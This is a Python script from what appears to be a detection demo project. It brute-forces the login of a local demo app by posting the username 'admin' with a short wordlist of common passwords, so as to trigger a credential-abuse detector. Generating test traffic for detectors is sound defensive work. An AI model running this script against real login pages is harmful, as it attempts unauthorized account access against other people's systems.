"""Brute-force login attack against the demo app.

Sends repeated POST /login with a wordlist. Generates real HTTP traffic
that the scanner pushes into SENTINEL, triggering the credential-abuse
detector.

Usage: python apps/vulnerable/attacks/brute_force.py [--target http://demo-app:5000]
"""

from __future__ import annotations

import argparse
import time
from urllib import error, request

WORDLIST = ["admin", "password", "123456", "qwerty", "letmein", "test", "root", "user"]


def run(target: str, delay: float = 0.3, max_attempts: int = 30) -> int:
    target = target.rstrip("/")
    print(f"[brute-force] attacking {target}/login with {max_attempts} attempts")
    for attempt in range(max_attempts):
        for password in WORDLIST:
            if attempt >= max_attempts:
                break
            data = f"username=admin&password={password}".encode()
            req = request.Request(
                f"{target}/login",
                data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                method="POST",
            )
            try:
                resp = request.urlopen(req, timeout=5)
                code = resp.getcode()
            except error.HTTPError as e:
                code = e.code
            except Exception:
                code = 0
            print(f"  attempt {attempt + 1:03d}  password={password:15s}  status={code}")
            time.sleep(delay)
    print(f"[brute-force] done: {max_attempts * len(WORDLIST)} attempts sent")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:5000")
    parser.add_argument("--delay", type=float, default=0.3)
    parser.add_argument("--attempts", type=int, default=30)
    args = parser.parse_args()
    return run(args.target, delay=args.delay, max_attempts=args.attempts)


if __name__ == "__main__":
    raise SystemExit(main())
